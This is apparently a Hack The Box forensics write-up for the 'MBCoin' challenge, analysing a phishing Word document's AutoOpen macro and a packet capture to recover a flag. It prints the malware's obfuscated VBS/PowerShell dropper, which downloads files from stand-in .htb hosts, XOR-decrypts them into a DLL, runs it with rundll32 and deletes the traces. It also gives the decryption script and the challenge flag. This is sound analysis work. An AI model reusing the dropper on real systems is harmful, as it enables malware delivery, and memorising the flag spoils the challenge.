# MBCoin

MBCoin was a medium Forensics challenge with only downloadable files.

### Challenge pretext:

We have been actively monitoring the most extensive spear-phishing campaign in recent history for the last two months. This campaign abuses the current crypto market crash to target disappointed crypto owners. A company's SOC team detected and provided us with a malicious email and some network traffic assessed to be associated with a user opening the document. Analyze the supplied files and figure out what happened.

The zip file consisted of 2 files:  **mbcoin.doc** and **mbcoin.pcapng**.

### mbcoin.doc
**mbcoin.doc** was an old Microsoft Word 97 - 2003 Document (.doc) format.  The file, when opened, showed a word document with the following text:

```
Hello,

Are you wondering about how you can make more money through a smarter investment? If you have looked at the profits available from cryptocurrency and thought it was too late, now is your chance. Get in on the ground floor today with the announcement of MBCoin.

You may be eligible for free MBCoin! Make sure to click “Enable Content” and this document will calculate how much MBCoin you’ve won.

Happy Investing to the Moon,

Monkey Business Investments
```
https://i.imgur.com/i24NXcT.png

The document had a macro that was set to run on AutoOpen (when document is loaded).
https://i.imgur.com/pajYgdX.png

Analyzed the VBA code, it looks to take 2 strings from the document somewhere (`ActiveDocument.Shapes(1)` and `(2)`) and write them to a file c:\\ProgramData\\pin.vbs, then execute it with: `cmd /k cscript.exe c:\ProgramData\pin.vbs`

When unzipping the .doc file with 7-zip I found a few other files that did not show up the first time, when using linux unzip.  Not sure why this was:
https://i.imgur.com/2x1RuiS.png

Inside the 1Table file, found plenty of VBA code with obfuscated Powershell commands. This looks to be the contents of the pin.vbs:
```
 L L 1   =   " $ N a n o = ' J O O E X ' . r e p l a c e ( ' J O O ' , ' I ' ) ; s a l   O Y   $ N a n o ; $ a a = ' ( N e w - O b ' ;   $ q q = ' j e c t   N e ' ;   $ w w = ' t . W e b C l i ' ;   $ e e = ' e n t ) . D o w n l ' ;   $ r r = ' o a d F i l e ' ;   $ b b = ' ( ' ' h t t p : / / p r i y a c a r e e r s . h t b / u 9 h D Q N 9 Y y 7 g / p t . h t m l ' ' , ' ' C : \ P r o g r a m D a t a \ w w w 1 . d l l ' ' ) ' ; $ F O O X   = ( $ a a , $ q q , $ w w , $ e e , $ r r , $ b b , $ c c   - J o i n   ' ' ) ;   O Y   $ F O O X | O Y ; " 
 
 L L 2   =   " $ N a n o z = ' J O O E X ' . r e p l a c e ( ' J O O ' , ' I ' ) ; s a l   O Y   $ N a n o z ; $ a a = ' ( N e w - O b ' ;   $ q q = ' j e c t   N e ' ;   $ w w = ' t . W e b C l i ' ;   $ e e = ' e n t ) . D o w n l ' ;   $ r r = ' o a d F i l e ' ;   $ b b = ' ( ' ' h t t p s : / / p e r f e c t d e m o s . h t b / G v 1 i N A u M K Z / j v . h t m l ' ' , ' ' C : \ P r o g r a m D a t a \ w w w 2 . d l l ' ' ) ' ; $ F O O X   = ( $ a a , $ q q , $ w w , $ e e , $ r r , $ b b , $ c c   - J o i n   ' ' ) ;   O Y   $ F O O X | O Y ; " 

[...]
 
 M M 1   =   " $ b   =   [ S y s t e m . I O . F i l e ] : : R e a d A l l B y t e s ( ( ( ' C : G P H ' + ' p r ' + ' o g ' + ' r a ' + ' m d a t a G ' + ' P H w w w 1 . d ' + ' l l ' )     - C r e P L a c E ' G P H ' , [ C h a r ] 9 2 ) ) ;   $ k   =   ( ' 6 i ' + ' I ' + ' g l ' + ' o ' + ' M k 5 ' + ' i R Y A w ' + ' 7 Z ' + ' T W e d 0 C r ' + ' j u Z 9 w i j y Q D j ' + ' K O ' + ' 9 M s 0 D 8 K 0 Z 2 H 5 M X 6 w y O K q F x l ' + ' O m 1 ' + ' X ' + ' p j m Y f a Q X ' + ' a c A 6 ' ) ;   $ r   =   N e w - O b j e c t   B y t e [ ]   $ b . l e n g t h ;   f o r ( $ i = 0 ;   $ i   - l t   $ b . l e n g t h ;   $ i + + ) { $ r [ $ i ]   =   $ b [ $ i ]   - b x o r   $ k [ $ i % $ k . l e n g t h ] } ;   i f   ( $ r . l e n g t h   - g t   0 )   {   [ S y s t e m . I O . F i l e ] : : W r i t e A l l B y t e s ( ( ( ' C : Y 9 A p r o ' + ' g r a m d a t ' + ' a ' + ' Y ' + ' 9 A w w w ' + ' . d ' + ' l l ' ) . R E p L a c e ( ( [ c h A r ] 8 9 + [ c h A r ] 5 7 + [ c h A r ] 6 5 ) , [ s T r i N g ] [ c h A r ] 9 2 ) ) ,   $ r ) } " 
 
 M M 2   =   " $ b   =   [ S y s t e m . I O . F i l e ] : : R e a d A l l B y t 
 
 [...]
 
 S e t   R a n   =   C r e a t e O b j e c t ( " w s c r i p t . s h e l l " ) 
 R a n . R u n   H H 0 + M M 1 , C h r ( 4 8 ) 
 W S c r i p t . S l e e p ( 5 0 0 ) 
 R a n . R u n   H H 0 + M M 2 , C h r ( 4 8 ) 
 W S c r i p t . S l e e p ( 5 0 0 ) 
 R a n . R u n   H H 0 + M M 3 , C h r ( 4 8 ) 
 W S c r i p t . S l e e p ( 5 0 0 ) 
 R a n . R u n   H H 0 + M M 4 , C h r ( 4 8 ) 
 W S c r i p t . S l e e p ( 5 0 0 ) 
 R a n . R u n   H H 0 + M M 5 , C h r ( 4 8 ) 
 
 W S c r i p t . S l e e p ( 1 5 0 0 0 ) 
 O K 1   =   " c m d   / c   r u n d l l 3 2 . e x e   C : \ P r o g r a m D a t a \ w w w . d l l , l d r " 
 O K 2   =   " c m d   / c   d e l   C : \ p r o g r a m d a t a \ w w w * " 
 O K 3   =   " c m d   / c   d e l   C : \ p r o g r a m d a t a \ p i n * " 
 R a n . R u n   O K 1 ,   C h r ( 4 8 ) 
 W S c r i p t . S l e e p ( 1 0 0 0 ) 
 R u n . R u n   O K 2 ,   C h r ( 4 8 )
 
 ```
 
 After studying the code for a while, I figured out that 5 dll files were being downloaded and decrypted on the machine: in LL1, pt.html is being downloaded from priyacareers.htb, then saved as www1.dll.  Then later on in MM1, the www1.dll file is decrypted and then saved as www.dll. 
 
 At the bottom of the code, the only dll that appears to actually be run is www.dll.  So it looks like the last file that successfully downloads is the actual www.dll, the others are never run. Looks like it loads a function 'ldr'.

I then uploaded the mbcoin.doc file to an online sandbox, https://any.run so I could watch it explode and capture any other possible clues easily, even though the domains it reaches out to don't look to exist in the real world.  Noticed the last step is the execution of rundll32.exe www.dll,ldr file just as I expected.
https://app.any.run/tasks/95061781-61c3-4dd6-bf3e-e5fcea6db905
https://i.imgur.com/cZsoNq7.png

### mbcoin.pcapng
**mbcoin.pcapng** is a packet capture file.  Therer were 4 different IPv4 conversations in total- 
1) some DNS requests to  10.1.1.5
2) a suspicious request to 192.0.2.111/ByH5NDoE3kQA/vm.html (cablingpoint.htb) 
3) a request to a missing page 203.0.113.223/ze8pCNTIkrIS/wp.html (business-z.htb)
4) a suspicious request to 10.1.1.163/u9hDQN9Yy7g/pt.html (priyacareers.htb)

The suspicious requests look to contain encrypted data:

```
GET /u9hDQN9Yy7g/pt.html HTTP/1.1
Host: priyacareers.htb
Connection: Keep-Alive
 

HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.8.10
Date: Wed, 29 Jun 2022 14:04:59 GMT
Content-type: text/html
Content-Length: 10752
Last-Modified: Wed, 29 Jun 2022 13:32:37 GMT


{3.gooMk1iRY..7Z.Wed0Crj5Z9wijyQDjKO9Ms0D8K0Z2H5MX6wyOKqFxlOm0Xpdr.ha.Q.B.7z.h3..>KE.=>3.Zz76.
_7R..zK..J.?d.... .T!.F=P.H5MX6wy{.......A.......(.l.3...[...?...@...M...w...
...+...
.../.......;...........8.......).......)...........9\
:)...ZTWed0CrjuZ9wijy..jK+.Ks...)0Z2H5MX6.ymkzDvsO}1XpvmYfaQX.pA66yIgloM.4iRYAg7ZTUed6CrjuZ9wojyQDjKO9=s0D<K0Z2H5OXVvyO[qFxlOm!XpjmYfaQHacA66iYgloMk5iRYAg7ZT.Md0.rjun.wi.yQDj.O9.s0D8.0Z.I5MX6wyOKqFx.Om.Xpj.zfa!XacA66iIgloMk5iRYAw7ZTWed0CBHuZyvijyQDjKO9Ms.D8.0Z2H5MX6wyOKqFxlOm1XpjmYfaQv..9B6iI.boMk%iRYQw7ZPWed0CrjuZ9wijyqDj+aK).D%8K.W2H5mX6wwOKqRxlOm1XpjmYfaQX!cAv.
[...]
```

Saved these files from 2) and 4) to vm.html and pt.html, by extracting all files via HTTP in Wireshark: File - Export Objects - HTTP - Save all

Copied/modified some of the powershell to decrypt the files and save them:

(Thanks to my co-worker Aaron for noticing the keys ARE different, by a couple characters in the middle, explaining why my files were not ever decrypting quite properly!)

```
$dir="C:\temp\mbcoin"

sl $dir
$fnames=@("pt.html",
          "vm.html")
$keys=@("6iIgloMk5iRYAw7ZTWed0CrjuZ9wijyQDjKO9Ms0D8K0Z2H5MX6wyOKqFxlOm1XpjmYfaQXacA6",
        "6iIoNoMk5iRYAw7ZTWed0CrjuZ9wijyQDjPy9Ms0D8K0Z2H5MX6wyOKqFxlOm1GpjmYfaQXacA6")

$x=0
foreach ($fname in $fnames) {
  $b = [System.IO.File]::ReadAllBytes("$($dir)\$($fname)"); 
  $k = $keys[$x]
  $r = New-Object Byte[] $b.length; 
  for($i=0; $i -lt $b.length; $i++) { 
    $r[$i] = $b[$i] -bxor $k[$i%$k.length]
  }
  if ($r.length -gt 0) { 
    [System.IO.File]::WriteAllBytes("$($dir)\$($fname).txt", $r)
  }
  $x+=1
}
```

Renamed both of these files pt.html.txt to www1.dll, and vm.html.txt to www4.dll.
Finally, at this point, I had a valid www1.dll and www4.dll.  

Ended up opening Ghidra to see what each dll does.  In www1.dll there was a note 'Are you sure this was the DLL loaded on the system?' which I had noticed earlier by browsing the binary.  This file was copied over and never run.

In www4.dll, I browsed to the ldr function, and found the flag:
https://i.imgur.com/Fbxr43I.png

Overall this challenge took me way longer than expected, as first I could not find the contents of pin.vbs since I was using linux unzip instead of 7-zip, and all my other attempts with oletools did not show it either, until I was able to see it in any.run (sandbox).

HTB{wH4tS_4_sQuirReLw4fFl3?}
